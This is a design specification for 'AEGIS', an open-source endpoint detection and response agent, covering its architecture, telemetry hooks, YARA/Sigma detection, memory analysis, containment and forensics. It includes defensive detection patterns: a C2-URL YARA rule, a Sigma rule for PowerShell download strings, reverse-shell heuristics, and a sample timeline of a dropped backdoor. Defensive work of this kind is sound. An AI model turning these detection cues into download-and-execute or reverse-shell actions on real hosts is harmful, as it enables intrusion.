# AEGIS - Master Project Specification
*Version 1.0.0-Spec*  
*Author: Senior Systems Architect & Principal Cybersecurity Engineer*  
*Classification: Open Source (Enterprise Grade)*

---

## 1. Executive Summary

### 1.1 Project Overview
AEGIS is an enterprise-grade, high-performance, cross-platform Endpoint Detection and Response (EDR) system. Built to operate as a low-overhead host security agent, AEGIS provides security teams with real-time visibility, automated threat detection, deep-dive forensics, memory inspection, and active response containment.

```
+-------------------------------------------------------------+
|                        AEGIS CLI                            |
|             (Administration, Scanning, Response)            |
+------------------------------+------------------------------+
                               | IPC: gRPC over UDS / Pipes
                               v
+-------------------------------------------------------------+
|                      AEGIS DAEMON                           |
|             (Service, Telemetry, Rules, Engines)            |
+-------------------------------------------------------------+
```

### 1.2 Vision
To establish an open, highly auditable, and extensible endpoint protection baseline that matches or exceeds proprietary enterprise EDR capabilities without introducing opaque agent behaviors or telemetry locking.

### 1.3 Mission
To deliver a CLI-first, memory-safe EDR framework that empowers blue teams, threat hunters, and incident responders with raw telemetry, granular local controls, and standardized detection rules (YARA, Sigma) directly on physical and virtual endpoints.

### 1.4 Goals
- **High Efficacy**: Native integration of signature-based, heuristic, and behavioral rule engines.
- **Low Impact**: Maximum baseline CPU footprint under 2% and RAM usage under 80MB.
- **Cross-Platform Parity**: Identical detection capabilities across Windows, Linux, and macOS, abstracting OS-level kernel telemetry into a normalized schema.
- **Instant Response**: Sub-second containment execution (process tree termination, firewall isolation, USB disabling).

### 1.5 Philosophy
- **CLI-First**: All daemon and inspection controls must be exposeable and scriptable via standard CLI outputs.
- **Transparency**: Zero telemetry cloaking. All rules, logs, and database files must reside in structured, human-readable, or standardized binary formats.
- **Defense in Depth**: Every detection module operates independently to prevent a single bypass from blinding the agent.

### 1.6 Core Principles
- **Memory Safety**: Core components utilize memory-safe principles to prevent exploit development vectors targeting the EDR agent.
- **Principle of Least Privilege**: The CLI runs in user space, delegating privileged execution strictly to a dedicated background daemon via a secured IPC boundary.
- **Local Autonomy**: The agent must detect, analyze, and isolate threats without requiring cloud connectivity.

### 1.7 Target Audience
- Security Operations Center (SOC) Analysts
- Incident Response (DFIR) Professionals
- Threat Hunters
- Security Researchers and Penetration Testers

### 1.8 Use Cases
1. **Real-time Threat Hunting**: Querying system configurations and running real-time behavioral correlations.
2. **Post-Breach Forensics**: Building execution timelines and parsing OS-specific artifacts (Prefetch, Shimcache, plist config, systemd logs).
3. **Automated Containment**: Setting strict policies that trigger host firewall isolation if a known C2 beacon pattern is detected.
4. **Compliance Auditing**: Exporting continuous process and file integrity hashes to a central SIEM.

---

## 2. Functional Requirements

### 2.1 Core Features
- **Real-Time Telemetry Event Capture**: Process starts, network connections, file write/delete, registry modifications, driver mounts, and USB inserts.
- **Static & Dynamic Signature Scan**: Direct filesystem scans targeting hash lists and compiled YARA rules.
- **Heuristic Memory Scanning**: Detecting unbacked memory execution, DLL injection, and reflective loading signatures.
- **Behavioral Correlation (Sigma)**: Continuous evaluation of event streams using Sigma-style rule filters.
- **Host Containment**: Dynamic host firewall modification, process tree termination, and virtual device blocking.
- **Digital Forensics Evidence Acquisition**: Memory dump capability, MFT parse, and event timeline compilation.

### 2.2 User Stories
- **US-01 (Analyst Threat Hunting)**: As a SOC Analyst, I want to query the local AEGIS agent via CLI to check for all network connections opened by unsigned binaries running from `/tmp` or `C:\Users\Public` in the last 24 hours.
- **US-02 (Automated Mitigation)**: As a Security Engineer, I want the AEGIS agent to immediately isolate the endpoint from the network and kill the active process if a signature match confirms Cobalt Strike beaconing activity in memory.
- **US-03 (Forensic Timeline)**: As a Digital Forensics Investigator, I want to generate a CSV timeline of all file changes and process launches occurring 5 minutes before and after a specific system alert.

### 2.3 Functional Scope
| Category | Requirement | Priority | Status |
|---|---|---|---|
| Monitoring | Capture Process Execution Metadata | Critical | Phase 1 |
| Monitoring | Capture File Modification / Creation events | Critical | Phase 1 |
| Monitoring | Capture Network Sockets (IPv4/v6) | Critical | Phase 1 |
| Monitoring | Capture Windows Registry changes | High | Phase 1 |
| Monitoring | Capture USB Device insertion/removal | Medium | Phase 2 |
| Detection | Execute Local YARA scans on target directories | Critical | Phase 1 |
| Detection | Evaluate system event logs against Sigma rules | High | Phase 2 |
| Detection | Calculate Entropy of running process memory segments | High | Phase 2 |
| Incident Response | Terminate Process Trees | Critical | Phase 1 |
| Incident Response | Implement OS Firewall Isolation | Critical | Phase 2 |
| Incident Response | Quarantine target files (encryption + ACL strip) | High | Phase 2 |

### 2.4 Non-Functional Requirements
- **Performance**: Daemon must consume < 2% CPU during normal monitoring operations. Disk writing must not exceed 5MB/hr under normal load.
- **Reliability**: Self-healing service daemon. If the daemon crashes, the OS service manager (systemd/launchd/Service Control Manager) must restart it within 5 seconds.
- **Security**: The IPC channel must be authenticated and encrypted using mutual TLS (mTLS) with dynamically rotated keys.
- **Portability**: Codebase must compile cleanly on x86_64 and ARM64 architectures for Windows, Linux, and macOS.

---

## 3. System Architecture

```
                    +---------------------------------------+
                    |               AEGIS CLI               |
                    +-------------------+-------------------+
                                        | gRPC over IPC
                                        v
+-----------------------------------------------------------------------------------+
|                                 AEGIS DAEMON                                      |
|                                                                                   |
|  +--------------------+   +---------------------+   +--------------------------+  |
|  | Telemetry Monitors |-->|   Event Normalizer  |-->|  Local Event Queue (Go)  |  |
|  | (ETW, ESF, eBPF)   |   | (ECS Schema Parser) |   |  (Ring Buffer / Storage) |  |
|  +--------------------+   +---------------------+   +------------+-------------+  |
|                                                                  |                |
|                                                                  v                |
|  +--------------------+   +---------------------+   +------------+-------------+  |
|  |   Incident Resp.   |<--|   Decision Engine   |<--|     Detection Engine     |  |
|  |  (Isolation, Kill) |   |  (Scoring Router)   |   |   (YARA, Sigma, Heur.)   |  |
|  +--------------------+   +---------------------+   +--------------------------+  |
+-----------------------------------------------------------------------------------+
```

### 3.1 High-Level Architecture
AEGIS uses a decoupled architecture splitting telemetry gathering, evaluation, and user control. The privileged background daemon (`aegisd`) maintains the event processing loop, while the non-privileged command-line interface (`aegis`) communicates via an encrypted IPC channel.

### 3.2 Component Architecture
1. **Telemetry Monitors**: Native drivers and user-space hooks capturing raw system calls and events.
2. **Event Normalizer**: Direct conversion of raw event data structures to the standardized Aegis Event Format (AEF), based on the Elastic Common Schema (ECS).
3. **Local Storage Engine**: Embedded relational and key-value database caches capturing local event histories.
4. **Detection Pipeline**: Multi-threaded correlation engine invoking static, behavioral, and memory engines.
5. **Incident Response Controller**: Platform-specific handlers performing kernel/firewall containment actions.
6. **IPC Core**: High-speed communication pipeline connecting client interfaces to the local daemon.

### 3.3 Internal Architecture
The daemon handles incoming data concurrently via worker pools. Each module runs as a non-blocking service implementing a standard interface:
```go
type AegisService interface {
    Start(ctx context.Context) error
    Stop() error
    Status() ServiceStatus
}
```

### 3.4 Data Flow
1. **Event Capture**: The Monitoring Engine captures a process execution event.
2. **Ingestion & Normalization**: The event is wrapped with system time, executing user SID/UID, parent PID, file hash, and normalized to ECS.
3. **Queuing**: The normalized event is pushed onto the in-memory ring-buffer queue.
4. **Evaluation**: Parallel workers extract events from the queue and evaluate them against loaded Sigma policies.
5. **Persistency**: The normalized event is written to the local SQLite/LSM cache database.

### 3.5 Event Flow
```
[Kernel Event] -> [OS API Hook] -> [Aegis Probe] -> [Normalizer] -> [Ring Buffer] -> [Engine Router]
```

### 3.6 Detection Pipeline
- **Stage 1 (Pre-Filter)**: Immediate hash lookup of the executing binary against a local reputation cache database.
- **Stage 2 (Static scan)**: If the binary is unknown, background thread runs YARA checks.
- **Stage 3 (Behavioral correlation)**: Continuous execution matching against loaded Sigma rules (e.g., matching command arguments for suspicious patterns).
- **Stage 4 (Risk Scoring)**: Summation of engine weights. If threshold exceeded, route alert to containment module.

### 3.7 Monitoring Pipeline
The monitoring pipeline enforces strict event filtering at the kernel level (or closest user-space library) to discard benign events before they consume CPU context switches inside the normalizer.

### 3.8 Response Pipeline
- **Trigger**: Policy violation (Alert Risk Score > 8.5) or manual command run via CLI (`aegis response block --pid 1234`).
- **Validation**: Daemon verifies caller authority, checks if target PID is a protected system process (e.g., `wininit.exe` or `systemd`), and logs the request.
- **Execution**: Platform-specific containment API invoked immediately.
- **Verification**: The monitoring pipeline verifies that the target process has exited or the network port is successfully blocked.

---

## 4. Project Structure

### 4.1 Monorepo Structure
The repository is organized into a clean, Go-style Monorepo, isolating command applications, platform wrappers, and shared utility packages.

```
aegis-edr/
├── cmd/
│   ├── aegis/             # User-facing administration CLI
│   └── aegisd/            # Root/SYSTEM background EDR service daemon
├── pkg/
│   ├── api/               # gRPC Service Definition, Protobuf contracts
│   ├── config/            # Policy structures, YAML parser, profile configs
│   ├── detect/            # Core Detection Engines
│   │   ├── signature/     # YARA wrapper, Hash reputation matching
│   │   ├── behavioral/    # Sigma engine interface, event state tracker
│   │   └── heuristics/    # Entropy calculator, process parent-child mapping
│   ├── forensics/         # Timeline builders, Prefetch/Shimcache/Auditd parsers
│   ├── monitor/           # Cross-platform Event Telemetry Gatherer
│   │   ├── platform/      # OS specific hooks (ETW/ESF/eBPF implementation)
│   │   └── eventrouter/   # Normalizer converting platform events to ECS
│   ├── response/          # Remediation modules (firewall block, quarantine, process kill)
│   ├── storage/           # Database layer (SQLite engine, Write-Ahead Logs)
│   └── sdk/               # Plugin SDK and WASM hooks
```

### 4.2 Package Responsibilities
- `cmd/aegis`: Compiles to CLI binary. Processes subcommands and formats stdout/stderr.
- `cmd/aegisd`: Compiles to system service binary. Spawns threads, handles signals (SIGTERM/SIGINT), runs engines.
- `pkg/monitor/platform`: Manages low-level API callbacks. Utilizes conditional compilation tags (e.g., `//go:build windows` or `//go:build linux`).
- `pkg/storage`: Manages schema migration, telemetry inserts, database vacuuming, and indexing.

### 4.3 Dependency Graph
```
cmd/aegis  ---->  pkg/api (gRPC Client)
                      |
                      v (gRPC Service Network/UDS)
cmd/aegisd ---->  pkg/api (gRPC Server)
                      |
                      +---> pkg/config
                      +---> pkg/monitor -> pkg/monitor/platform
                      +---> pkg/detect  -> pkg/detect/signature (YARA)
                      +---> pkg/storage -> pkg/storage (SQLite)
                      +---> pkg/response
```

---

## 5. Technology Stack

### 5.1 Programming Language
- **Go (Version 1.22+)**: Used for the concurrency model, platform compilation targets, and garbage collection profiles optimized for low-latency system applications.
- **C / Assembly**: Minimal assembly blocks for highly optimized entropy calculations and PE header inspection.

### 5.2 CLI Framework
- **Cobra**: Utilized for clean subcommands, automated flag parsing, and POSIX compliance.

### 5.3 UI Framework
- **Bubbletea (TUI)**: Terminal user-interface framework for interactive live monitoring commands.
- **React / Tailwind / TypeScript (Fleet Console)**: Used for the enterprise web dashboard management console.

### 5.4 Database
- **SQLite 3**: WAL (Write-Ahead Logging) mode enabled. Serves as the primary local event, configuration, and audit logging store.
- **BadgerDB**: An LSM-tree key-value database, optimized for temporary high-frequency raw telemetry event buffer logs.

### 5.5 Detection Libraries
- **libyara (YARA v4.5+)**: C-go bindings for native performance.
- **Sigma Go Parser**: Custom parser optimized for stream-processing JSON event maps.

### 5.6 Networking
- **gRPC**: Structured RPC over Unix Domain Sockets (Linux/macOS) and Named Pipes (Windows) for local IPC.
- **HTTP/2**: mTLS-secured communication with the central management server.

### 5.7 Logging
- **Zap**: Structured JSON log writer configured for zero-allocation performance.

### 5.8 Configuration
- **Viper**: Configuration coordinator parsing YAML configuration files, OS environment variables, and CLI overrides.

### 5.9 Reporting
- **Go Templates**: Compiles forensic timelines to Markdown, CSV, or structured JSON.

### 5.10 Build System
- **GNU Make**: Orchestrates compilation, cross-compilation matrix building, test executing, and code formatting.

### 5.11 Package Managers
- **Go Modules**: Standard package dependency management.
- **pnpm**: Package management for dashboard frontend web packages.

### 5.12 Third-Party Integrations
- **MITRE ATT&CK**: Local JSON databases mapping event techniques directly.
- **STIX/TAXII**: STIX 2.1 compliance parser for threat intelligence ingestion.

---

## 6. CLI Design

### 6.1 Command Structure
The `aegis` command-line utility follows standard POSIX patterns:
```
aegis [command] [subcommand] [flags]
```

### 6.2 Subcommands
- `aegis status`: Queries daemon service state, rule database version, and resource consumption.
- `aegis scan [path]`: Launches immediate static folder scan using loaded YARA rules.
  - Flags: `--recursive`, `--output=[json|table]`, `--rules=[path]`.
- `aegis monitor`: TUI view showing live process execution and network activity.
- `aegis rule [list|add|validate]`: Installs or updates Sigma/YARA policies.
- `aegis response [isolate|kill|quarantine]`: Manually executes mitigation hooks.
  - Flags: `--pid [num]`, `--ip [cidr]`, `--file [path]`.
- `aegis forensics [timeline|collect]`: Acquires evidence items and compiles temporal logs.
- `aegis config [get|set]`: Alters active agent configurations.

### 6.3 Global Flags
- `-h, --help`: Displays usage guide.
- `-v, --verbose`: Enables debug logging on commands output.
- `--format`: Format target (e.g., `table`, `json`, `csv`, `yaml`). Default: `table`.
- `--socket`: Direct override path for gRPC IPC connection daemon socket.

### 6.4 Output Formats
JSON output is guaranteed to follow strict structural models for automation piping:
```json
{
  "timestamp": "2026-07-11T09:04:13Z",
  "status": "success",
  "command": "scan",
  "results": {
    "scanned_files": 1245,
    "matches": [
      {
        "file": "/tmp/malware.elf",
        "rule": "SUSP_ELF_Packer",
        "score": 8.0
      }
    ]
  }
}
```

### 6.5 Interactive Mode
Invoking `aegis monitor --interactive` spins up a Bubbles-based terminal UI:
- **Pane 1**: Live telemetry stream (Process creation, active socket connections).
- **Pane 2**: System metric meters (CPU usage, memory footprint, event ingestion rate).
- **Pane 3**: Alerts panel highlighting matching Sigma rules.

---

## 7. Detection Engine

```
              +--------------------------------------+
              |            Ingested Event            |
              +------------------+-------------------+
                                 |
                                 v
              +--------------------------------------+
              |           Hash Reputation            | ===> Match? [CONTAIN]
              +------------------+-------------------+
                                 | No Match
                                 v
              +--------------------------------------+
              |        Behavioral Matching           | ===> Score > 8.0? [CONTAIN]
              +------------------+-------------------+
                                 | Score: Low/Med
                                 v
              +--------------------------------------+
              |          Entropy Calculation         | ===> Entropy > 7.2? [SCAN MEMORY]
              +--------------------------------------+
```

### 7.1 Signature Detection
- **Hash Lookup**: SHA256 matches executed binaries against a pre-compiled local database of known signatures.
- **YARA Evaluator**: In-memory binary file scanning utilizing C-go pointers directly pointing to raw file offsets. Fast memory scanning using rule limits:
  ```yara
  rule Aegis_Malicious_Proc {
      strings:
          $c2_url = "http://bad-c2-server.com"
      condition:
          $c2_url
  }
  ```

### 7.2 Behavioral Detection
- **Process Lineage Tracker**: Retains parent-child state machine trees to identify execution chains (e.g., `word.exe` spawning `powershell.exe` spawning `cmd.exe`).
- **Sequence Matching**: Tracks state trends over time (e.g., process writes binary to system directory, registers service, immediately launches network socket).

### 7.3 Heuristic Detection
- **Anomalous System API Access**: Flags execution of native APIs commonly abused by packers (e.g., calling `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` permissions).
- **Process Renaming Check**: Matches executing executable headers against disk file names (e.g., binary internally named `svchost.exe` running as `notmalicious.exe`).

### 7.4 Risk Scoring
Every alert is assigned a compound risk score \(R_c\) calculated dynamically:
\[R_c = \min\left(10.0, \sum (W_i \times S_i)\right)\]
Where:
- \(W_i\) is the static weight assigned to the engine (e.g., YARA Signature = 0.9, Network Heuristic = 0.4).
- \(S_i\) is the individual detection score (confidence rating).
- If \(R_c \ge 8.0\), automatic isolation playbooks execute.

### 7.5 False Positive Handling
- **Global Whitelist**: Cryptographic signature validation. Binaries signed by trusted internal root authorities or Microsoft/Apple/Linux vendor keys bypass behavioral scanning filters.
- **Rule Exclusions**: Target-specific filters containing strict exceptions (e.g., excluding automated backup tools executing file modification events under `/backup/`).

---

## 8. Monitoring Engine

### 8.1 OS Telemetry Implementations
AEGIS uses platform-specific compilation to collect telemetry natively:
- **Windows**:
  - Event Tracing for Windows (ETW): Subscribes to `Microsoft-Windows-Kernel-Process`, `Microsoft-Windows-Kernel-File`, and `Microsoft-Windows-Kernel-Network` providers.
  - Windows Filtering Platform (WFP): Network flow interception.
- **Linux**:
  - eBPF (kprobes/tracepoints): Attaches probes to `sys_enter_execve`, `sys_enter_connect`, `sys_enter_openat`, and `sys_enter_write`.
  - Fanotify: Real-time file system monitoring with pre-content access decision capabilities.
- **macOS**:
  - Endpoint Security Framework (ESF): Subscribes to `ES_EVENT_TYPE_AUTH_EXEC`, `ES_EVENT_TYPE_NOTIFY_FORK`, `ES_EVENT_TYPE_NOTIFY_OPEN`, and `ES_EVENT_TYPE_NOTIFY_WRITE`.

### 8.2 Monitoring Targets
1. **Process Monitoring**: Tracks launches, executions, PID recycle maps, environment arguments, and exit statuses.
2. **File Monitoring**: Captures write permissions, file execution transitions, modifications, renames, and deletions.
3. **Registry Monitoring** *(Windows Specific)*: Inspects system autostart registry keys (e.g., `Run`, `RunOnce`, `Shell`), service creation keys, and local machine configurations.
4. **Service Monitoring**: Captures systemd unit insertions/modifications on Linux, launchd plist creations on macOS, and Service Control Manager hooks on Windows.
5. **Driver Monitoring**: Telemetry on kernel driver loading events (`sys_init_module` on Linux, kernel extension loads on macOS, driver signing verification on Windows).
6. **USB Monitoring**: Captures USB storage media inserts. Parses VID/PID details and serial numbers against allowed whitelist databases.
7. **Network Monitoring**: Maps active socket states, listening ports, remote IPs, remote hostnames, and transfer throughput.

---

## 9. Malware Analysis Engine

### 9.1 Static Analysis
The static analyzer parses unexecuted binaries natively without spawning execution environments:

```
[Target File] -> [Format Parser: PE/ELF/Mach-O] -> [Verify Header Signatures]
                                                  -> [Calculate Shannon Entropy]
                                                  -> [Inspect IAT / Imports]
                                                  -> [Extract ASCII & Unicode Strings]
```

### 9.2 Format Parsing
- **PE (Portable Executable) Parser**: Traverses Section Headers, export directories, TLS callbacks, and Resource directories.
- **ELF Parser**: Reads section headers, dynamic link maps, symbol mappings, and program headers.
- **Mach-O Parser**: Analyzes fat binary structures, load commands, code signatures, and segments.

### 9.3 Entropy Analysis
Calculates Shannon Entropy \(H\) of binary sections to detect packed or encrypted payloads:
\[H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)\]
Where:
- \(P(x_i)\) is the probability of occurrence of character/byte \(x_i\) within the target section.
- If section entropy \(H > 7.2\), the binary is flagged as packed/encrypted.

### 9.4 Import Analysis
- **Import Address Table (IAT)**: Evaluates APIs requested by the executable.
- **Suspicious API Sequences**: Flags binaries requesting suspicious combinations (e.g., `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` in Windows PE imports).

### 9.5 Strings Analysis
- **Parser**: Extracts ASCII (minimum length 4) and Unicode (UTF-16) sequences.
- **Pattern Matching**: Flags domains, IPv4 patterns, email patterns, and known shellcode header signatures.

---

## 10. Memory Analysis

### 10.1 Volatile Memory Inspection
The memory analysis engine operates by scanning active process address spaces in user space:
```go
// Linux process memory mapping reader
func ScanProcessMemory(pid int, pattern []byte) ([]uintptr, error) {
    // Read /proc/[pid]/maps to scan VM ranges
}
```

### 10.2 Process Memory Scanning
Traverses virtual memory mappings (`PAGE_READWRITE`, `PAGE_EXECUTE_READWRITE`). It skips system-mapped read-only library segments to optimize performance.

### 10.3 DLL Injection Detection
- **Windows**: Identifies unbacked executable pages (`PAGE_EXECUTE_READ` memory regions lacking corresponding mapped files on disk).
- **Linux/macOS**: Identifies anonymous mapped segments containing executable code (`PROT_EXEC` without mapped files).

### 10.4 Injected Code Detection
- **API Hook Audits**: Compares DLL/shared library export functions in memory against their disk image formats to detect inline patching (e.g., hotpatching, JMP replacement).
- **Thread Hijacking Check**: Verifies thread entry points point strictly within valid code segments of loaded modules.

### 10.5 Reflective Loading Detection
- Detects in-memory execution of PE/ELF formats without filesystem tracing.
- Scans for MZ headers (`0x4D5A`) or ELF magic bytes (`0x7F454C46`) at unaligned page offsets within heap allocations.

---

## 11. Threat Intelligence

### 11.1 IOC Management
- Local database storage of Indicators of Compromise (IOCs).
- Fast lookup tables:
  ```sql
  CREATE TABLE ioc_reputation (
      ioc_value TEXT PRIMARY KEY,
      ioc_type TEXT NOT NULL, -- 'sha256', 'ipv4', 'domain'
      threat_actor TEXT,
      mitre_tactic TEXT,
      updated_at TIMESTAMP
  );
  ```

### 11.2 Reputation Services
- **Local Cache**: Local hash lists queried first to minimize latency.
- **Dynamic API Sync**: Configurable outbound connector contacting threat feeds (e.g., AlienVault OTX, VirusTotal, MISP) on a scheduled basis.

### 11.3 MITRE ATT&CK Mapping
- Each Sigma rule, heuristic trigger, and YARA signature contains a metadata tag mapping directly to MITRE ATT&CK techniques (e.g., `T1059.001` for PowerShell execution).
- Event logs output this metadata to streamline investigation routing.

### 11.4 STIX/TAXII
- Integrates a native TAXII client to parse STIX 2.1 JSON packages, converting threat intelligence structures directly into local SQLite IOC lookup tables.

---

## 12. Network Security

### 12.1 Real-Time Network Auditing
Telemetry captures remote endpoint targets, ports, and protocols:
- **DNS Logging**: Collects queries and responses, checking for suspicious top-level domains (TLDs) or dynamically generated domains (DGA - Domain Generation Algorithms).
- **HTTP/HTTPS SNI Interception**: Evaluates Server Name Indication (SNI) values on TLS handshakes to block connection requests to malicious domain hosts.

### 12.2 Reverse Shell Detection
- Detects processes spawning with standard input, output, or error descriptors redirected to network socket descriptors.
- Identifies command interpreter processes (`/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`) with active TCP/UDP connections.

### 12.3 Beaconing Detection
Evaluates timing sequences of outbound connection requests to detect C2 activity:
- Calculates connection intervals \(T\) and verifies standard deviation \(\sigma\) values.
- If \(\sigma < 1.0\text{ second}\) (representing high timing consistency) or follows a predictable jitter sequence, the connection pattern is flagged as a beacon.

---

## 13. Rule Engines

### 13.1 YARA Compiler Integration
- Raw YARA rules (`.yar`) compile locally into native byte code sequences during daemon initialization.
- Dynamic memory scanning runs in parallel thread routines.

### 13.2 Sigma Log Parser
- Parses local telemetry records and applies Sigma filters in memory.
- Example YAML conversion target:
  ```yaml
  title: PowerShell Download String
  detection:
    selection:
      CommandLine|contains:
        - 'downloadstring'
        - 'downloadfile'
    condition: selection
  ```

### 13.3 Custom Correlation Engine
- Supports multi-event correlations over variable time ranges (e.g., event A occurred, followed by event B within 30 seconds on the same host).
- Implemented using in-memory state tracking tables indexed by Host, ProcessID, and User.

### 13.4 Policy Engine
- Enforces corporate baseline configuration limits (e.g., checking if root ssh password logins are enabled, or remote registry service is running).
- System compliance state is checked every 30 minutes.

---

## 14. Incident Response

### 14.1 Containment Mechanisms
Remediation actions are implemented using native OS tools to guarantee clean, dependency-free execution:

| Operation | Windows Implementation | Linux Implementation | macOS Implementation |
|---|---|---|---|
| **Kill Process** | `TerminateProcess` API | `syscall.Kill(pid, SIGKILL)` | `syscall.Kill(pid, SIGKILL)` |
| **Quarantine File** | Moving file to encrypted directory + strip permissions | Moving file to encrypted directory + strip permissions | Moving file to encrypted directory + strip permissions |
| **Network Isolation** | WFP block rule | `iptables` / `nftables` | `pfctl` rules |
| **USB Blocking** | Disable device via SetupAPI | Write "authorized 0" to `/sys/bus/usb/devices/` | Block via Endpoint Security |

### 14.2 File Quarantine Protocol
1. **Locking**: Locks file descriptors.
2. **Encryption**: Encrypts file payload using AES-256-GCM.
3. **Relocation**: Relocates file into the secure AEGIS quarantine directory (`/var/lib/aegis/quarantine/` or `C:\ProgramData\Aegis\Quarantine\`).
4. **ACL Strip**: Alters file ACL permissions, setting owner to EDR service and removing execution rights.

---

## 15. Digital Forensics

### 15.1 Evidence Collection
- Spawns memory dumping workers to copy target process memory spaces onto disk.
- Parses local filesystem layout logs (e.g., reading MFT records on Windows, running directory traversals on Linux).

### 15.2 Timeline Generation
- Merges events from the telemetry store, process history logs, and system audit logs into a single chronologically sorted output.
- Emits timeline streams:
  ```
  2026-07-11T09:04:00Z | PROCESS | PID: 4005 | /usr/bin/wget launched
  2026-07-11T09:04:02Z | FILE    | PID: 4005 | Written: /tmp/backdoor
  2026-07-11T09:04:03Z | PROCESS | PID: 4006 | Launched: /tmp/backdoor
  ```

### 15.3 Artifacts Extraction
- **Windows**: Parses Prefetch (`.pf`), Shimcache, Amcache registry entries, and Event Logs (`.evtx`).
- **Linux**: Parses `wtmp`/`utmp` logs, shell history files (`.bash_history`), and systemd journal logs.
- **macOS**: Parses Unified Logging databases, System Plists, and user shell history files.

---

## 16. Database Design

### 16.1 Local Telemetry Storage
AEGIS uses SQLite for persistent local telemetry storage. Indexes are optimized to speed up timeline generation and reputation checks.

```
+------------------------------------+
|             PROCESSES              |
+------------------------------------+
| process_id   : INTEGER (PK)        |
| parent_id    : INTEGER             |
| binary_path  : TEXT                |
| sha256       : TEXT                |
| command_line : TEXT                |
| username     : TEXT                |
| launched_at  : TIMESTAMP (Indexed) |
+------------------------------------+
                  | 1
                  |
                  | 0..*
+------------------------------------+
|          FILE_MODIFICATIONS        |
+------------------------------------+
| event_id     : INTEGER (PK)        |
| process_id   : INTEGER (FK)        |
| file_path    : TEXT (Indexed)      |
| action       : TEXT                |
| occurred_at  : TIMESTAMP           |
+------------------------------------+
```

### 16.2 Schema Definition
```sql
CREATE TABLE processes (
    process_id INTEGER PRIMARY KEY,
    parent_id INTEGER,
    binary_path TEXT NOT NULL,
    sha256 TEXT NOT NULL,
    command_line TEXT,
    username TEXT,
    launched_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE file_modifications (
    event_id INTEGER PRIMARY KEY AUTOINCREMENT,
    process_id INTEGER,
    file_path TEXT NOT NULL,
    action TEXT NOT NULL, -- 'WRITE', 'DELETE', 'CREATE'
    occurred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(process_id) REFERENCES processes(process_id)
);

CREATE TABLE network_connections (
    connection_id INTEGER PRIMARY KEY AUTOINCREMENT,
    process_id INTEGER,
    protocol TEXT NOT NULL,
    local_ip TEXT NOT NULL,
    local_port INTEGER NOT NULL,
    remote_ip TEXT NOT NULL,
    remote_port INTEGER NOT NULL,
    occurred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(process_id) REFERENCES processes(process_id)
);

CREATE TABLE alert_logs (
    alert_id INTEGER PRIMARY KEY AUTOINCREMENT,
    risk_score REAL NOT NULL,
    rule_name TEXT NOT NULL,
    trigger_value TEXT,
    occurred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### 16.3 Storage Optimization & Retention
- **PRAGMA Settings**: Configured with `PRAGMA journal_mode=WAL;`, `PRAGMA synchronous=NORMAL;`, and `PRAGMA cache_size=10000;`.
- **Pruning Policy**: Local storage runs database cleanup routines every 24 hours, dropping records older than 7 days unless marked as related to active security alerts.

---

## 17. API Design

### 17.1 Local Daemon API (gRPC)
The daemon hosts a local gRPC service over Unix Domain Sockets (`/var/run/aegis.sock`) and Windows Named Pipes (`\\.\pipe\aegis`):

```protobuf
syntax = "proto3";
package aegis.api.v1;

service AegisService {
  rpc GetStatus(StatusRequest) returns (StatusResponse);
  rpc RunScan(ScanRequest) returns (stream ScanResult);
  rpc TriggerResponse(ResponseRequest) returns (ResponseResponse);
  rpc GetTimeline(TimelineRequest) returns (stream TimelineEvent);
}

message StatusRequest {}
message StatusResponse {
  string version = 1;
  string status = 2;
  double cpu_usage = 3;
  double ram_usage = 4;
}

message ScanRequest {
  string path = 1;
  bool recursive = 2;
}
message ScanResult {
  string file_path = 1;
  bool matched = 2;
  string match_rule = 3;
}

message ResponseRequest {
  string action = 1; // "KILL", "ISOLATE", "QUARANTINE"
  int32 target_pid = 2;
  string target_ip = 3;
  string target_file = 4;
}
message ResponseResponse {
  bool success = 1;
  string log_output = 2;
}

message TimelineRequest {
  int64 start_time = 1;
  int64 end_time = 2;
}
message TimelineEvent {
  string timestamp = 1;
  string category = 2; // "PROCESS", "FILE", "NETWORK"
  string description = 3;
}
```

### 17.2 Cloud Console API (REST / HTTPS)
- **POST /api/v1/agent/enroll**: Enrolls new agents using an activation token.
- **POST /api/v1/agent/telemetry**: Uploads alerts and compressed metadata.
- **GET /api/v1/agent/rules**: Fetches latest YARA signatures and Sigma rules.

---

## 18. Plugin SDK

### 18.1 Architecture
The plugin interface enables third-party developers to register custom telemetry parsers and mitigation hooks. It runs compiled WebAssembly (WASM) binaries inside a sandboxed Wasmtime runtime to guarantee memory isolation.

```
+-------------------------------------------------------+
|                     AEGIS DAEMON                      |
|                                                       |
|   +--------------------+     +---------------------+  |
|   |    Event Router    |     |  Wasmtime Sandbox   |  |
|   |                    |-->  | (Plugin Lifecycle)  |  |
|   +--------------------+     +---------+-----------+  |
+----------------------------------------|--------------+
                                         v
                               +---------+-----------+
                               |    Custom Plugin    |
                               | (Log parser/action) |
                               +---------------------+
```

### 18.2 Plugin Lifecycle
1. **Load**: Daemon discovers `.wasm` plug-ins under the plugin directory.
2. **Verification**: Validates cryptographic file signatures against trusted public keys.
3. **Initialization**: Invokes `_initialize` within the WASM module.
4. **Hook Execution**: Feeds event maps to the WASM entry point.
5. **Shutdown**: Gracefully unregisters hooks and releases memory space.

### 18.3 Extension Hooks
- `OnProcessCreate(event: Event)`: Inspects or modifies process event metadata.
- `OnNetworkConnect(event: Event)`: Custom network inspection.
- `ExecuteCustomMitigation(context: ResponseContext)`: Executes custom response playbooks.

---

## 19. Fleet Dashboard (Future Component)

### 19.1 Dashboard Architecture
The dashboard consists of two frontends: a Terminal User Interface (TUI) for local management and a React Web App for central fleet management.

```
                        +----------------------------+
                        |      FLEET CONTROLLER      |
                        |      (Central Server)      |
                        +--------------+-------------+
                                       |
                   +-------------------+-------------------+
                   | HTTPS                                 | HTTPS
                   v                                       v
+------------------+---------+           +-----------------+---------+
|     Agent Host 1 (Daemon)  |           |     Agent Host 2 (Daemon)  |
|  +----------------------+  |           |  +----------------------+  |
|  |      Aegis TUI       |  |           |  |      Aegis TUI       |  |
|  +----------------------+  |           |  +----------------------+  |
+----------------------------+           +----------------------------+
```

### 19.2 TUI Layout (Terminal Console)
